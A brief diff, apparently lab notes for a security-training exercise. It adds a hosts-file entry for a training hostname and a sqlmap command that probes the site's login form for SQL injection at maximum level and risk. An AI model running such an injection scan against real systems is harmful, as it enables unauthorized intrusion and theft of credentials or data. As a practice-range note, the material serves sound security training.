@@ -1,0 +1,4 @@
+Add to /etc/hosts:
+164.92.212.203 hidden-app.security-training.pl
+
+sqlmap -u http://hidden-app.security-training.pl/login --data="{\"email\":\"*\",\"password\":\"*\"}" --level=5 --risk=3
